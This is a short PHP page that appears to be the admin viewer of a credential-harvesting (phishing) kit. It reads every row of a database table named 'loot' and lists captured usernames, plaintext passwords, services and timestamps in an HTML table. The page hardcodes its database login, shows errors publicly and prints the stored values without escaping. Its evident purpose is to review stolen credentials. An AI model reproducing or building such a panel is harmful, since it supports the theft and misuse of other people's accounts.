<?php

	ini_set("display_errors", 1);
	error_reporting(E_ALL);

	$conn = mysqli_connect('127.0.0.1', 'dpuser', 'Eggy123', 'DPPortal');
	$dpquery = "SELECT * FROM loot";
	$dpresult = $conn->query($dpquery);
?>


<!DOCTYPE html> 
<html lang="en"> 
<head>  
    <title>Display Data</title> 
</head> 
<body> 
 
<h1>User List</h1> 
 
<table border="1"> 
	<tr>
		<th>ID</th>
		<th>Username</th>
		<th>Password</th>
		<th>Service</th>
		<th>datetimestamp</th>
	</tr>
	<tr>

	<?php while ($row = $dpresult->fetch_assoc()) { 
            			echo '<tr>'; 
            			echo '<td>' . $row["id"] . '</td>';
            			echo '<td>' . $row["username"] . '</td>';
            			echo '<td>' . $row["password"] . '</td>';
	    			echo '<td>' . $row["service"] . '</td>';
            			echo '<td>' . $row["datetimestamp"] . '</td>';
            			echo '</tr>';
			}
 
    			// Close connection 
    		$conn->close(); 
    	?> 
 
</table> 
 
</body> 
</html> 
